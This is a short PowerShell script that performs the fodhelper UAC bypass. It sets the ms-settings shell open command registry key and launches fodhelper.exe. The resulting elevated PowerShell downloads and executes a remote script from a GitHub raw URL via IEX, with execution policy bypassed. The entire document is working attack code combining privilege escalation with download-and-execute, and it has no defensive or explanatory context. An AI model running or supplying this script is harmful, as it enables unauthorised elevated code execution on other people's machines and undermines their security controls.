# This script's only job is to trigger the UAC bypass and launch an elevated PowerShell.
$RegKey = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
Set-ItemProperty -Path $RegKey -Name "(Default)" -Value "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/launcher.ps1')\""
Set-ItemProperty -Path $RegKey -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"